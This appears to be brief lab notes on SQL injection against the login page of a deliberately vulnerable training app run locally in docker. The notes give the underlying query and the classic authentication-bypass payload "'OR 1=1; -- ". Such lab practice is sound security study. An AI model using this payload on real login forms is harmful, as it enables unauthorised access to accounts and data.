# Environment: docker pull citizenstig/nowasp

# Target password
# http://localhost/index.php?page=login.php

# Original Query
SELECT username FROM accounts WHERE username='';

# SQL Injection
'OR 1=1; -- 